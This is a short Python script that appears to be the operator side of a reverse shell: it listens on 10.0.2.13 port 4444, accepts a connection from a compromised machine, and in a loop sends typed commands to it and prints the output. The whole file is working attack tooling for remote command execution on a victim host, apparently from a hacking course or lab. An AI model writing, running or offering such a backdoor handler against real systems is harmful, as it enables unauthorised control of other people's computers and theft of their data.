import socket


class Listener:
    def __init__(self, ip, port, start=True):
        listener = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections')
        self.connection, address = listener.accept()
        print(f'[+] Got a connection from {address}')

        if start:
            self.run()

    def execute_remotely(self, command):
        command = command.encode()
        self.connection.send(command)
        return self.connection.recv(1024).decode(errors='replace')

    def run(self):
        while True:
            command = input('>> ')
            result = self.execute_remotely(command)
            print(result)


Listener('10.0.2.13', 4444)
